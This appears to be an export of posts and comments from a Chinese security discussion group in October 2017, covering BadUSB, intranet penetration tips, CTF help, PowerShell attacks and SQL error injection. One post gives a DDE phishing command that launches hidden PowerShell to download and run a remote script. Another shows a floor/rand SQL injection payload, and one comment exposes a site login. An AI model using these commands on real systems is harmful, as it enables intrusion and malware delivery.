<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 用心了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 谁可以帮忙把本圈的精华整理个2017集合，我们会很感激😋

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 做成ppt可以么。

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: [白眼]你们平时都没时间的么

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: pdf/html方便传播，而且美观

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 创业苦逼呀，忙得要死

<img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: [捂脸]资源打包么  主要评论有的也有些干货

<img src="https://file.xiaomiquan.com/6f/26/6f26f50dfa361fc2967683dc5ec6c59eb715511dfeb0f6985900ac985d3d0ec5.jpg" width="25px"/> __王布斯__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: gitbook那种形式就行吧

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/6f/26/6f26f50dfa361fc2967683dc5ec6c59eb715511dfeb0f6985900ac985d3d0ec5.jpg" width="25px"/> __王布斯__: 也行呀

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: 工作量其实不小，主要是还要分类，排版，哈哈，

<img src="https://file.xiaomiquan.com/eb/53/eb53a8909d2f0bfd345e71bfcc6b322fcd6e50c7ad2d00fc6eda5c3aa8b09c60.jpg" width="25px"/> __浩宇__: 可以吗 我有点感兴趣。觉得做gitbook 不错   但又担心做了会不会就没人付费进这个圈子了  而且有些东西会不会造成侵权什么的

<img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 还是学生，大把时间[呲牙]


...

---

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ on 2017-10-24:


__#姿势#__

 BadUsb+Empire 让目标持久怀孕
胡乱写的，莫怪莫怪！[难过]
密码:alone

[http://hackerwing.com/2017/10/24/BadUsb-Empire-%E8%AE%A9%E7%9B%AE%E6%A0%87%E6%8C%81%E4%B9%85%E6%80%80%E5%AD%95/](http://hackerwing.com/2017/10/24/BadUsb-Empire-%E8%AE%A9%E7%9B%AE%E6%A0%87%E6%8C%81%E4%B9%85%E6%80%80%E5%AD%95/)





...

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 哈哈，手机上这个密码没用。只要把js禁用就行了。静态站点。QAQ

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 可以可以

<img src="https://file.xiaomiquan.com/c4/e2/c4e2337e4bf259351a4901662d84873c79cfb48880892a23d7c754b817ea4ad5.jpg" width="25px"/> __np__: 只有我觉得前端的效果好6么[发抖][发抖][发抖]

<img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__: Badusb不管payload怎么改,调小调隐藏窗口，当插入别人电脑的时候终还是会有东西弹出来让别人察觉。然后taobao买了800多的橡皮鸭除了官方提供的payload比较全面之外也没有什么特别的地方，这些东西真的只能自己玩，然后以为做的隐藏比较完全，结果连客户鸟都不鸟这种东西。

<img src="https://file.xiaomiquan.com/60/e4/60e47e828e20c259db7e6a604da3964fec6b1c5e5798187d47e63927ae9271a0.jpg" width="25px"/> __大芳的小明。💋__: 喜欢这个博客的背景

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__: 因为人家是甲方！滑稽。

<img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 不是 是某部门具体要实战用

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/1b/56/1b5688b7f998d36743d8be15316cbca7c8257f305fef2e7e01daa043d827db35.jpg" width="25px"/> __DarkEvil__: 学生狗不懂，😢😢😢


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-23:

> 匿名用户 提问：
【漏洞挖掘思路】 cos前辈，面对内网数千台服务器（内网互访，数据库、操作系统、web容器等均不超过4种，安全设备透明），只有ip信息，如何通过人工高效挖掘漏洞，求战略性指导意见。


人工？我先不管你是不是一定要纯粹人工，如果不是，可以这样：

1. 大规模端口探测，看端口都开放了什么，找对应服务漏洞；
2. 爆破相关服务的密码；
3. 挖你说的这几个不是件容易的事，但有 0day 那就可以畅通无阻；
4. 别漏了路由器漏洞，嵌入式固件的漏洞挖掘相对容易些；
5. 玩玩 Responder MITM；
6. 有域控，试试 DeathStar；
7. 不用问我更多了，技巧也许会太多，一切看场景，而且还得看你能否更进一步。

擅于使用相关工具、掌握各类渗透技巧及掌握 Python 这类语言进行必要编码，才能高效。



...

<img src="https://file.xiaomiquan.com/7e/6e/7e6e47b51f5a9733c99849a1458f703fdb6abecf319d98a1500d009c1f02b46a.jpg" width="25px"/> __Sunset__: 内网ftp服务器可以提权拿下吗，同服务器下还有个网站

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 目标不同，手法不同？拿到某个机器，还是控制整个内网？
切记，千万，千万不要用arp，尽量动静小点

看内网是域还是工作组。
域可以看看GPP ms14068
工作组相对来说麻烦一点(很难控制整个内网)
内网拿到一台机器之后，记着提取本地的缓存凭据，后续扩大渗透，还有看看进程是否有域管理员。


...

---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-10-23:


__#资讯#__

 

今年供应链攻击似乎很热…
供应链攻击又一例：Mac 专用 Elmedia 播放器和下载管理器 Folx 最新版本感染 OSX.Proper 恶意软件
这次波及到了macos平台

链接:
[供应链攻击又一例：Mac 专用 Elmedia 播放器和下载管理器 Folx 最新版本感染 OSX....](http://hackernews.cc/archives/16085)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有意思

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 也是下血本 光远控成本就得几十W

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 看到Flox，立马对本机检测了一下  果断卸载


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-22:

> yann.y 提问：
[Challenge 求助] Root-me 上一道 LFI+审计 (CMSimple 3.0) 的题 ，要拿到管理员的密码。两天了实在做不出来，请余大和大家帮帮忙！

密码应该在 `/cmsimple/config.php` 里。
- LFI 在 GET 的 `sl` 参数上，但参数强制加了 `.php` 后缀且无法截断。

题目:
[http://challenge01.root-me.org/realiste/ch6/](http://challenge01.root-me.org/realiste/ch6/)


CMSimple 3.0源码:
[https://www.cmsimple.org/archives/cmsimple_old/?download=cmsimple3_0.zip](https://www.cmsimple.org/archives/cmsimple_old/?download=cmsimple3_0.zip)




感兴趣的一起交流进来。



...

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 弱弱问一句，LFI是本地文件包含？

<img src="https://file.xiaomiquan.com/31/80/318029acf30b3d4586096db28e750f29673a5f7b2b5c12b15a110e6b4721975b.jpg" width="25px"/> __yann.y__ replies to <img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 是

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 代码审计入门的题库老大推荐个

<img src="https://file.xiaomiquan.com/72/36/72361a71a8bb41c3cfe905a413fa9fd58103146921ab496b17987b507247e6c4.jpg" width="25px"/> __Ruler__: 围观

<img src="https://file.xiaomiquan.com/31/80/318029acf30b3d4586096db28e750f29673a5f7b2b5c12b15a110e6b4721975b.jpg" width="25px"/> __yann.y__ replies to <img src="https://file.xiaomiquan.com/72/36/72361a71a8bb41c3cfe905a413fa9fd58103146921ab496b17987b507247e6c4.jpg" width="25px"/> __Ruler__: 别啊，我还有好多题屯着。都是差那临门一脚😷

<img src="https://file.xiaomiquan.com/32/3c/323c9df4ddcbf4793ab36832e291f0152cd94181245c43958f190ca74d7098f3.jpg" width="25px"/> __Royal.__ replies to <img src="https://file.xiaomiquan.com/31/80/318029acf30b3d4586096db28e750f29673a5f7b2b5c12b15a110e6b4721975b.jpg" width="25px"/> __yann.y__: 比赛连接怎么打不开

<img src="https://file.xiaomiquan.com/72/36/72361a71a8bb41c3cfe905a413fa9fd58103146921ab496b17987b507247e6c4.jpg" width="25px"/> __Ruler__ replies to <img src="https://file.xiaomiquan.com/31/80/318029acf30b3d4586096db28e750f29673a5f7b2b5c12b15a110e6b4721975b.jpg" width="25px"/> __yann.y__: 好的好的尽力而为

<img src="https://file.xiaomiquan.com/31/80/318029acf30b3d4586096db28e750f29673a5f7b2b5c12b15a110e6b4721975b.jpg" width="25px"/> __yann.y__ replies to <img src="https://file.xiaomiquan.com/32/3c/323c9df4ddcbf4793ab36832e291f0152cd94181245c43958f190ca74d7098f3.jpg" width="25px"/> __Royal.__: 难道国内被墙了吗？

<img src="https://file.xiaomiquan.com/72/36/72361a71a8bb41c3cfe905a413fa9fd58103146921ab496b17987b507247e6c4.jpg" width="25px"/> __Ruler__: 确实打不开，一片空白

<img src="https://file.xiaomiquan.com/31/80/318029acf30b3d4586096db28e750f29673a5f7b2b5c12b15a110e6b4721975b.jpg" width="25px"/> __yann.y__ replies to <img src="https://file.xiaomiquan.com/72/36/72361a71a8bb41c3cfe905a413fa9fd58103146921ab496b17987b507247e6c4.jpg" width="25px"/> __Ruler__: 试下从主站 (
[Welcome [Root Me : Hacking and Information Securit...](https://www.root-me.org/?lang=en))

 登录再跳过去试试。账号@密码: yann_y@anosiugUVY67s7


...

---

<img src="https://file.xiaomiquan.com/57/49/5749fefd038db1a8926a9b98e904282b730fd5030a50cca7ecf93deeb6520c95.jpg" width="25px"/> __狗汪汪__ on 2017-10-22:

哈哈..刚从某会回来..发现老外的安全研究领域特别生猛..不知道有没有国人在做类似的研究..

<img src="https://file.xiaomiquan.com/30/13/3013996ee0dc95d5de8f9453e61752f3186d95deb93f8598d4ab5e5621f159bc.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/e1/af/e1af78f24624e170edf7fc1b10649d004fbd9850a87de19239d33667abae888f.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/c5/ad/c5ad6eda9d71255fecfb8107d781bbb2bb21d651d8c4542f0dddd008fb4dbcc3.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/85/71/85719caf9009810578122825dcb626facc006faa89a1c793dbc30f4e8e402e44.jpg" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/65/d1/65d1abbc8485f5e6ecd2a1c4211f6982354b00caa2cefaeafc03ee22eb287426.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 回头淘宝一个研究研究[呲牙]

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: Paper有公开吗，发来看看

<img src="https://file.xiaomiquan.com/57/49/5749fefd038db1a8926a9b98e904282b730fd5030a50cca7ecf93deeb6520c95.jpg" width="25px"/> __狗汪汪__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有的...‪ 
[GitHub - internetofdongs/IoD-Screwdriver: Plugin f...](https://github.com/internetofdongs/IoD-Screwdriver)

‬

<img src="https://file.xiaomiquan.com/57/49/5749fefd038db1a8926a9b98e904282b730fd5030a50cca7ecf93deeb6520c95.jpg" width="25px"/> __狗汪汪__: 

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 大佬研究的东西就是不一样，都sex了。

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 有意思的研究啊

<img src="https://file.xiaomiquan.com/72/99/7299c4eb457c2dc094dc80ceb68ba0f8d0a2f217eb31c8d10c1d715b7eaaa5f3.jpg" width="25px"/> __mutcoee__: 之前wy的跳蛋流

<img src="https://file.xiaomiquan.com/57/49/5749fefd038db1a8926a9b98e904282b730fd5030a50cca7ecf93deeb6520c95.jpg" width="25px"/> __狗汪汪__ replies to <img src="https://file.xiaomiquan.com/72/99/7299c4eb457c2dc094dc80ceb68ba0f8d0a2f217eb31c8d10c1d715b7eaaa5f3.jpg" width="25px"/> __mutcoee__: 这哥们比较系统 而且有pornhub 赞助


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-22:

> 匿名用户 提问：
Discuz网站被黑，大神能否提供相关解决方案的付费咨询或服务，或者介绍靠谱的服务团队也好。谢谢啦。
0 0


这个谁愿意接，可以帮忙下。顺便这个提问的费用我打赏给帮助者。



...

<img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 题主私信我看看，不确定能帮到你

<img src="https://file.xiaomiquan.com/69/6e/696ee4df68da6ae05cee2566cfbbd43a6d5a7ae5761165024532137358376309.jpg" width="25px"/> __史力克.李__: 广东安创

<img src="https://file.xiaomiquan.com/69/6e/696ee4df68da6ae05cee2566cfbbd43a6d5a7ae5761165024532137358376309.jpg" width="25px"/> __史力克.李__: 😄

<img src="https://file.xiaomiquan.com/78/6a/786a4b3d1edd8d0868e64eb1cbcc4f8b9ea0c6ba337568781987b9bfd90ce896.jpg" width="25px"/> __小猜__: 已私信两位

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/78/6a/786a4b3d1edd8d0868e64eb1cbcc4f8b9ea0c6ba337568781987b9bfd90ce896.jpg" width="25px"/> __小猜__: 谁帮忙成功说下，我打赏[悠闲]

<img src="https://file.xiaomiquan.com/78/6a/786a4b3d1edd8d0868e64eb1cbcc4f8b9ea0c6ba337568781987b9bfd90ce896.jpg" width="25px"/> __小猜__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好的

<img src="https://file.xiaomiquan.com/72/99/7299c4eb457c2dc094dc80ceb68ba0f8d0a2f217eb31c8d10c1d715b7eaaa5f3.jpg" width="25px"/> __mutcoee__: 私信一下看看


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-22:

> yann.y 提问：
余大，请问圈内可以发关于CTF的提问吗，比如CTF实在做不出来希望求教思路


可以，描述时具体些，让大家都省点力。



...

<img src="https://file.xiaomiquan.com/31/80/318029acf30b3d4586096db28e750f29673a5f7b2b5c12b15a110e6b4721975b.jpg" width="25px"/> __yann.y__: 会的，谢谢


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-10-22:


__#科普#__

 powershell攻击方式的学习

前几天office出了个漏洞，可以直接使用文档中的（DDE）协议来执行命令，该方法可以不适用宏就能执行系统命令，对钓鱼攻击帮助很大，因为现在很多网关型设备，例如防火墙、邮件网关的会过滤或者检测宏，利用DDE协议可以直接调用powershell执行反弹shell命令，网上有很多复现方法了，我就不在这里去详说了，仅贴一个在茄牛那里看到的技巧。

"c:\\Programs\\Microsoft\\office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://XXXXXXX/power.ps1');powershell -e $e # " "for security reasons"

这个技巧更具有迷惑性，会在弹出的对话框中显示的是调用MSWord.exe，这个是很容易让人中招的。
通过Empire这个powershell攻击神器生成payload，然后进行监听。这种钓鱼方式对一般用户成功率很大，并且AV暂时无法检测。

后来继续延伸学习powershell的攻击方式，我把弦哥之前在圈中发的赛门铁克关于powershell的研究paper仔细读了一遍，姿势确实长进不少，文档作者写的非常详细，因为我那初中水平的英语读来实在压力太大，只能一句句去翻译然后用中文写下来再看，这样效果很好[囧]，现在把我简单翻译过的文档分享给像我这样的小白，我仅翻译了其中攻击阶段(执行脚本、横向渗透、持久控制)、混淆两个主要是攻击技巧的段落。但是也花了我很多时间，主要英语太水。
看完后你会对powershell攻击方式有个很全面的了解。另外想说看英文资料真的感觉技术介绍全面很多。


__分享文件:__
[powershell 攻击中的应用.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 赞！

<img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__: 看到你说一句一句写下来，我真为自己感到羞愧。。。我都机翻的[捂脸]

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__: 别说了，太丢人[囧]

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 能贴一下这个技巧的出处链接吗

<img src="https://file.xiaomiquan.com/46/04/46044dcd330b5e4cb18e8f31dd2f3b3f2a953af94425bb53f714f59d497244ba.jpg" width="25px"/> __程序员－玄魂__: 原文链接？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 这个技巧是在别的小秘圈看到的，我贴的那段代码加上DDEAUTO就是全部内容了，附件那个文档的原文在我们圈子，弦哥发的一篇主题里，赛门铁克关于powershell的研究，你找一下。

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 昨天分析nishang里脚本的时候看到了，但是自己单独拿出来用的时候-e参数那里会报错，是因为我远程下载的脚本事先还要进行编码吗？然后我把分号后面改成了 iex $e # " "for security reasons"才可以。如果是的话为什么不直接用后一种方式？另外关于这个利用DDE协议进行攻击，我在本机测试成功了，然后传给同学用又没反应了，不知道是不是因为word版本的问题，我自己的是2010版本的，他们的都是新的。关于这类攻击还有没有好的参考资料？加个扣友交流下？谢谢！

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 发私信给你了


...

---

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ on 2017-10-22:


__#基础#__

 floor以及updatexml报错注入原理等等
updatexml，ExtractValue等对我来说比较容易接受，但是floor好像要绕一点。
在SQL注入时，floor报错是比较常用的，将其与group by相结合，达到报错的效果。
举个栗子：
[Sponsons Replacement Tubes and Rib Fenders | Wing ...](http://wing.com)

?id=1 and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
但是原理可能有些人还不了解，反正属于基础类话题，研究的比较透彻的大牛有自己的见解的话，希望指教一二。
mysql官方文档中，rand这个函数是不能和order by 、group by 语句一起使用的，会爆出记录重录，然后我们查询的version()，current_user(）啥的都可以利用这个得到，但是可以这样： SELECT * FROM tbl_name ORDER BY RAND();
至于原理嘛，我比较懒，表达能力不是很好，这是我看到的几篇paper，给大家分享下。

[关于Mysql注入过程中的五种报错方式及具体利用案例 – jinglingshu的博客](http://www.jinglingshu.org/?p=4507)



[根据mysql报错进行回显注入的原理是什么？ - 知乎](https://www.zhihu.com/question/21031129)



[Mysql报错注入原理分析(count()、rand()、group by)](https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&mid=403404979&idx=1&sn=27d10b6da357d72304086311cefd573e&scene=1&srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect)


总之，还是得了解mysql。QAQ！

<img src="https://file.xiaomiquan.com/3f/3d/3f3d229e47736d41e18be6db0840a9ac07771d4c59609d81dae3157b5ac5a19a.png" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/01/35/013566d7eb9a4665a7cb7843b1af2fedc7c3cf202000fcac0a649d3312d56fb5.png" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 
[SQL注入的常规思路及奇葩技巧](https://mp.weixin.qq.com/s/hBkJ1M6LRgssNyQyati1ng)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-19:

我还能说什么：斯诺登2010年泄漏NSA机密文档介绍的BADDECISION项目，疑似就是KRACK攻击，所以该漏洞被exploit至少7年了。


[07-Introduction-to-BADDECISION-Redacted](https://www.documentcloud.org/documents/3031639-07-Introduction-to-BADDECISION-Redacted.html)





...

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 想想协议也服役13年了

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 那这些老毛子到底还有多少不为人知的东西。😂😂

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 挖洞这种事早就该上升为国家战略了[悠闲]

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 这事值得一试。

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 路漫漫其修远兮 吾将上下而求索

<img src="https://file.xiaomiquan.com/3f/16/3f163367e182ea761220cbd7bda16b9ee6d325dbbb31156bc1175ebabafe7747.jpg" width="25px"/> __***__: 怪不得祖国要自己搞WAPI...不过也不了解其是否也有漏洞。。。😂

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 原来如此，看上去很像呀

<img src="https://file.xiaomiquan.com/e1/00/e100c6649e7211ae83de05a72bebc940db70ce033ea11ee32bf5971ed6568bf8.jpg" width="25px"/> __眠熊__ replies to <img src="https://file.xiaomiquan.com/3f/16/3f163367e182ea761220cbd7bda16b9ee6d325dbbb31156bc1175ebabafe7747.jpg" width="25px"/> __***__: 国内搞WAPI跟这个没关系的

<img src="https://file.xiaomiquan.com/a5/5d/a55d1e3effebe0173c3ce83679167d3e48d4cce42cbf8872058a11f2142b56e3.jpg" width="25px"/> __渣渣__: 可怕

<img src="https://file.xiaomiquan.com/31/25/31254abb1de0594857f57786f9915393792db057f35056a77039e9d273cab5f5.jpeg" width="25px"/> __天天向上__: 这还是知道的已如此恐惧了，还有多少隐匿的


...

---

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ on 2017-10-19:


__#在线技能树#__

 
漏洞银行的在线技能树，里面的wiki都是小伙伴们分享的，这个不像cos的技能树，这个就是我这种懒人专用:)QAQ，想知道什么就去翻，大部分是常用的wiki，，没事就去翻翻,目前只有web的。里面的东西一直都在持续更新。

[漏洞银行(BUGBANK) 官方网站 | 全球漏洞悬赏平台](https://skills.bugbank.cn/)



<img src="https://file.xiaomiquan.com/99/16/99162d649073e7859d8dd38f48c4a12d1d692b1f4bacd7853ccc5f34c47e649e.png" width="50%" height="50%" align="middle"/>
